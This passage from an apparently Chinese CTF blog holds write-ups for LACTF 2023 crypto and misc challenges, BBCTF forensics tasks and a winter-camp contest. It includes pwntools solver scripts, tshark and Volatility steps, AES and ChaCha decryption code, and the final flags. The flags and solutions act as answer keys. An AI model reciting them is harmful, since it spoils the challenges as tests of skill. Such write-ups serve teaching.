id="3-rolling-in-the-mud"><a href="#3-rolling-in-the-mud" class="headerlink" title="3. rolling in the mud"></a>3. rolling in the mud</h4><p><img src="/mdimg/LACTF2023/2.png"><br>Solve the pigsty password.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;</span><span class="language-xml">dugip</span><br></code></pre></td></tr></table></figure><p>After the reverse order, use quip to blast.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">lactf</span><span class="hljs-template-variable">&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</span><br></code></pre></td></tr></table></figure><h4 id="4-greek-cipher"><a href="#4-greek-cipher" class="headerlink" title="4. greek cipher"></a>4. greek cipher</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ<span class="hljs-string">&#x27;ι ργσκ ιηγτ. οσμιδ&#123;ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ&#x27;</span>ι<span class="hljs-literal">_</span>θιπψ<span class="hljs-literal">_</span>ωπν.<span class="hljs-literal">_</span>λγοο<span class="hljs-literal">_</span>ψοσωγκ<span class="hljs-literal">_</span>ς<span class="hljs-literal">_</span>τνθι<span class="hljs-literal">_</span>θσω.μπζερσιθ!&#125;<br>print(<span class="hljs-string">&#x27;&#x27;</span>.join(sorted(<span class="hljs-keyword">set</span>(input()))))<br></code></pre></td></tr></table></figure><p>This code implements the de-reordering function of a string. It takes user input as a string, converts it to a set, and removes duplicate characters. Then, it sorts the collection, and converts it back to a string. Finally, the code prints out the result using the “print” function.<br>and then with the help of a tool site<a href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/LACTF2023/3.png"><br>Then use Cyberchef’s Substitute.<br><img src="/mdimg/LACTF2023/4.png"><br>Finally, quipqiup can be blasted.</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">lactf&#123;i_guess_using_many_greek_characters_didn<span class="hljs-symbol">&#x27;t_stop_you._well_played_i_must_say.congrats</span>!&#125;<br></code></pre></td></tr></table></figure><h4 id="5-guess-the-bit"><a href="#5-guess-the-bit" class="headerlink" title="5. guess-the-bit!"></a>5. guess-the-bit!</h4><p>Carefully observe the encryption source code logic, 150 cycles are performed, and each cycle generates a random number c, which is either the square of the original number, or the product of the square of the original number and 6. So you need to guess whether the number is a square or a multiple of 6.</p><p><img src="/mdimg/LACTF2023/5.png"><br>As shown in the figure above, if both conditions are true, return “1” to the server, otherwise return “0”. Write a script with the help of pwntools.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure><h4 id="6-chinese-lazy-theorem-2"><a href="#6-chinese-lazy-theorem-2" class="headerlink" title="6. chinese-lazy-theorem-2"></a>6. chinese-lazy-theorem-2</h4><p>According to the chinese lazy theorem, if you find <code>target % p</code> and <code>target % q</code>, you can find <code>target % pq</code>, but knowing <code>target % pq</code> is not enough, because the maximum target is <code>p*q*2*3 *5</code>, so try 30 times <code>(target % pq) + i * pq</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>    p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>    x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>    y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>    a, b = crt([p,q],[x,y])<br>    r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>        r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br>        <span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1-ECB"><a href="#1-ECB" class="headerlink" title="1. ECB"></a>1. ECB</h4><p>UDP traffic analysis, using RFC 3514，<a href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/LACTF2023/7.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Flags <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> abbreviation <span class="hljs-keyword">of</span> flag Segment, which <span class="hljs-keyword">is</span> a flag field.<br>It <span class="hljs-keyword">is</span> actually a field <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> IP packet header. Because most <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> TCP, UDP, <span class="hljs-keyword">and</span> <span class="hljs-built_in">application</span> layer protocols are encapsulated <span class="hljs-keyword">in</span> IP packets, you will often see this field when analyzing these protocols.<br>The identification field has <span class="hljs-number">3</span> bits.<br>Reserved bit: <span class="hljs-number">1</span> bit, which <span class="hljs-keyword">is</span> a reserved bit <span class="hljs-keyword">and</span> generally <span class="hljs-keyword">not</span> used;<br>Don&#x27;t fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> fragmented (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> data packet <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> fragmented);<br>More fragment: <span class="hljs-number">1</span> bit, used <span class="hljs-keyword">to</span> indicate whether <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> fragment (Not <span class="hljs-keyword">set</span> means <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> one).<br></code></pre></td></tr></table></figure><p>Check the flags field and the Data segment. The data segment has 1 byte of data.<br><img src="/mdimg/LACTF2023/8.png"><br>Looking down, in N0.5, the setting of Reserved bit has changed.<br><img src="/mdimg/LACTF2023/9.png"><br>Check RFC 3514 official document, if <code>Reserved bit</code> is set to <code>1 (0x1)</code>, it is a malicious packet.<br><img src="/mdimg/LACTF2023/10.png"><br>So we only need to filter out the packets whose <code>Reserved bit</code> is 0, set the data and Reserved bit as columns, and set the Reserved bit as 0 as the filter condition, that is, <code>ip.flags.rb == 0</code>, observe The first few discoveries are the hex values of lactf.<br><img src="/mdimg/LACTF2023/11.png"><br>Export the filtered UDP flow, open the saved UDP flow packet and track the UDP flow directly.<br><img src="/mdimg/LACTF2023/12.png"><br>You can also use tshark.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">tshark</span> -r <span class="hljs-type">EBE</span>.pcap -<span class="hljs-type">Y</span> <span class="hljs-string">&quot;ip.flags.rb == 0x0&quot;</span> -<span class="hljs-type">T</span> fields -e <span class="hljs-class"><span class="hljs-keyword">data</span> | xxd -r -p</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/LACTF2023/13.png"></p><h4 id="2-CATS"><a href="#2-CATS" class="headerlink" title="2.CATS!"></a>2.CATS!</h4><p><img src="/mdimg/LACTF2023/14.png"><br><img src="/mdimg/LACTF2023/15.png"><br><a href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>There is their official website in the article, as shown in the figure below<br><img src="/mdimg/LACTF2023/16.png"></p><h4 id="3-hidden-in-plain-sheets"><a href="#3-hidden-in-plain-sheets" class="headerlink" title="3. hidden in plain sheets"></a>3. hidden in plain sheets</h4><p>The flag is in another Sheet but we don’t have permission to view it.</p><p><img src="/mdimg/LACTF2023/17.png"><br>After checking the data, I found that the <code>IMPORTRANGE</code> function of Google Sheets can import the content.<br><img src="/mdimg/LACTF2023/18.png"><br>So use IMPORTRANGE to get the flag directly<br><img src="/mdimg/LACTF2023/19.png"></p><h4 id="4-discord-l34k"><a href="#4-discord-l34k" class="headerlink" title="4. discord l34k"></a>4. discord l34k</h4><p>The topic gave a discord link</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>discord.com<span class="hljs-regexp">/channels/</span><span class="hljs-number">1060030874722259057</span><span class="hljs-regexp">/1060030875187822724/</span><span class="hljs-number">1060031064669700186</span><br></code></pre></td></tr></table></figure><p><a href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a>  Find key images in this post.<br><img src="/mdimg/LACTF2023/20.png"></p><p>Below the image see the URL for the JSON API. In the given URL, the first ID ( 1060030874722259057 ) refers to the server, so we put that in the image where the example ID is. This gives us the link.</p><p><a href="https://discordapp.com/api/servers/1060030874722259057/widget.json">https://discordapp.com/api/servers/1060030874722259057/widget.json</a><br><img src="/mdimg/LACTF2023/21.png"><br>After opening it, I found that it is an invitation link. After opening it, enter the LA CTF-Chall Server 5 server, and you can see the flag.<br><img src="/mdimg/LACTF2023/22.png"><br><img src="/mdimg/LACTF2023/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
      <tag>Pwn</tag>
      
      <tag>Crypto</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BB CTF Forensics</title>
    <link href="/2023/02/07/BBCTF/"/>
    <url>/2023/02/07/BBCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Memory-Dump"><a href="#1-Memory-Dump" class="headerlink" title="1. Memory Dump"></a>1. Memory Dump</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>I was learning powershell when my pc suddenly crashed. Can you retrieve my bash history?</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>之前长安杯做过PowerShell的取证题，PowerShell历史命令文件路径为<br><code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code><br>所以我们直接去filescan<code>ConsoleHost_history.txt</code><br><img src="/mdimg/2023BBCTF/1.png"><br>虽然报错了 但还是找出来了捏 dump一下<br><img src="/mdimg/2023BBCTF/2.png"><br>cat 一下下<br><img src="/mdimg/2023BBCTF/3.png"><br>AES解密即可<br><img src="/mdimg/2023BBCTF/4.png"></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>因为<code>ConsoleHost_history.txt</code>为文本形式，所以利用strings转换一下直接搜索<code>flag&#123;</code>即可<br><img src="/mdimg/2023BBCTF/5.png"></p><h2 id="2-Vastness-of-Space"><a href="#2-Vastness-of-Space" class="headerlink" title="2. Vastness of Space"></a>2. Vastness of Space</h2><h3 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h3><p>Is space really that empty?</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>查看图片exif信息<br><img src="/mdimg/2023BBCTF/6.png"><br>steghide隐写 password：BBCTF<br><img src="/mdimg/2023BBCTF/7.png"><br>用matplotlib库还原一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>data = np.genfromtxt(<span class="hljs-string">&quot;somedata.txt&quot;</span>, delimiter=<span class="hljs-string">&quot;,&quot;</span>)<br><br>num = data[:,<span class="hljs-number">0</span>]<br>data = data[:,<span class="hljs-number">1</span>]<br><br>plt.plot(num,data, <span class="hljs-string">&#x27;ro&#x27;</span>)<br><br>plt.xlabel(<span class="hljs-string">&#x27;x&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;y&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023BBCTF/8.png"><br>扫码即可get flag</p><h2 id="3-Random-Requests"><a href="#3-Random-Requests" class="headerlink" title="3. Random Requests"></a>3. Random Requests</h2><h3 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h3><p>I captured these very random http requests. Can you help me decode them?</p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>过滤HTTP流量可以看到有很多GET请求 flag=0/flag=1，所以猜测flag就是由二进制数据组成<br><img src="/mdimg/2023BBCTF/9.png"><br>写脚本&amp;手撸&amp;用tshark提取一下都可以，这里用tshark提取二进制数据<br><code>tshark -r random_requests.pcapng -Y &quot;http.request.method == &quot;GET&quot;&quot; | cut -d &#39;/&#39; -f2 | cut -d &#39; &#39; -f1 | cut -d &#39;=&#39; -f2 | tr -d &#39;\n&#39;</code><br><img src="/mdimg/2023BBCTF/10.png"><br>然后cyberchef一把梭<br><img src="/mdimg/2023BBCTF/11.png"></p><h2 id="4-Imageception"><a href="#4-Imageception" class="headerlink" title="4. Imageception"></a>4. Imageception</h2><h3 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h3><p>“The painter has the universe in his mind and hands.”<br>-Leonardo Da Vinci</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目名称为imageception，所以直接FileScan搜索<br><code>python vol.py -f ./BBCTF/Imageception.raw windows.filescan.FileScan | grep &quot;imageception&quot;</code><br><img src="/mdimg/2023BBCTF/12.png"><br>发现有个<code>imageception.png</code> 把他dump下来<br><img src="/mdimg/2023BBCTF/13.png"><br>这里显示Error dumping file 但是文件夹里已经dump出来了。<br><img src="/mdimg/2023BBCTF/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第二届山石网科冬令营</title>
    <link href="/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
    <url>/2023/02/06/2023%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h2><p><img src="/mdimg/2023sswk/1.png"><br>网上找了个脚本，AES解密即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Crypto;<br><span class="hljs-keyword">import</span> java.security.InvalidAlgorithmParameterException;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.SecretKey;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Crypto</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String str2, String str22, SecretKey secretKey, IvParameterSpec ivParameterSpec)</span> <span class="hljs-keyword">throws</span> IllegalBlockSizeException, BadPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> Cipher.getInstance(str2);<br>        instance.init(<span class="hljs-number">2</span>, secretKey, ivParameterSpec);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(instance.doFinal(Base64.getDecoder().decode(str22)));<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvalidKeyException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decryptedString</span> <span class="hljs-operator">=</span> decrypt(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>, <span class="hljs-string">&quot;HyKsaPpqT4l436tHiSEXtIlLgVV4GE7mGc2WoI0KlP2YhKFco7OPcJYtS58BFwDq&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;AES&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">12</span>, <span class="hljs-number">32</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">23</span>, <span class="hljs-number">108</span>, <span class="hljs-number">31</span>, <span class="hljs-number">108</span>, <span class="hljs-number">44</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">121</span>, <span class="hljs-number">42</span>, <span class="hljs-number">113</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>&#125;));<br>        System.out.println(<span class="hljs-string">&quot;After decryption - &quot;</span> + decryptedString);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//hsnctf&#123;android_is_not_e4sy_will_caref1ul&#125;</span><br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">a3ZxZndpe2owMGdfb3hmbl9rZHloX2l4cX0=</span><br><span class="language-xml"></span><br><span class="language-xml">base64:</span><br><span class="language-xml">kvqfwi</span><span class="hljs-template-variable">&#123;j00g_oxfn_kdyh_ixq&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">caeser 3:</span><br><span class="language-xml">hsnctf</span><span class="hljs-template-variable">&#123;g00d_luck_have_fun&#125;</span><br></code></pre></td></tr></table></figure><h2 id="strange-chacha"><a href="#strange-chacha" class="headerlink" title="strange_chacha"></a>strange_chacha</h2><p>CryptoCTF Aniely原题 参考春哥的wp：<a href="https://zhuanlan.zhihu.com/p/545950898">https://zhuanlan.zhihu.com/p/545950898</a></p><p> chacha流密码，产生一段密钥流用于加密，类似伪随机数发生器，产生密钥流 。爆破一个短随机数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AS</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, passphrase</span>):<br>        self.passphrase = passphrase<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">go</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">mixer</span>(<span class="hljs-params">u, v</span>):<br>            <span class="hljs-keyword">return</span> ((u &lt;&lt; v) &amp; <span class="hljs-number">0xffffffff</span>) | u &gt;&gt; (<span class="hljs-number">32</span> - v)<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">forge</span>(<span class="hljs-params">w, a, b, c, d</span>):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                w[a] = (w[a] + w[b]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[d] = mixer(w[a] ^ w[d], <span class="hljs-number">16</span> // (i + <span class="hljs-number">1</span>))<br>                w[c] = (w[c] + w[d]) &amp; <span class="hljs-number">0xffffffff</span><br>                w[b] = mixer(w[b] ^ w[c], (<span class="hljs-number">12</span> + <span class="hljs-number">2</span>*i) // (i + <span class="hljs-number">1</span>))<br><br>        bring = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        bring[:<span class="hljs-number">4</span>] = [<span class="hljs-number">0x61707865</span>, <span class="hljs-number">0x3320646e</span>, <span class="hljs-number">0x79622d32</span>, <span class="hljs-number">0x6b206574</span>]<br>        bring[<span class="hljs-number">4</span>:<span class="hljs-number">12</span>] = unpack(<span class="hljs-string">&#x27;&lt;8L&#x27;</span>, self.passphrase)<br>        bring[<span class="hljs-number">12</span>] = bring[<span class="hljs-number">13</span>] = <span class="hljs-number">0x0</span><br>        bring[<span class="hljs-number">14</span>:] = [<span class="hljs-number">0</span>] * <span class="hljs-number">2</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            w = <span class="hljs-built_in">list</span>(bring)<br>            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                forge(w, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xc</span>)<br>                forge(w, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xd</span>)<br>                forge(w, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0xe</span>)<br>                forge(w, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xf</span>)<br>              